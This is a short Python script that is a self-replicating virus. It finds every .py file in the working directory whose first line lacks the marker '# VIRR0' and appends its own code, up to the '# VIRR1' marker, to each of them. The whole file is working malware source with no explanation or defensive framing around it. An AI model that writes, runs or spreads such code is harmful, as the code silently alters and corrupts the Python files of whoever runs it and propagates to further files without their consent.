# VIRR0
import os
import glob

cwd = os.getcwd()
pyfiles = glob.glob(f"{cwd}/*py")
healthy = []
inject = []

for path in pyfiles:
    with open(path, 'r') as f:
        lines = f.readlines()
        if lines:
            if lines[0] != "# VIRR0\n":
                healthy.append(path)
        else:
            healthy.append(path)

with open(__file__, 'r') as f:
    for line in f.readlines():
        inject.append(line)
        if line == "# VIRR1\n":
            break

for file in healthy:
    with open(file, 'a') as f:
        for line in inject:
            f.write(line)
# VIRR1
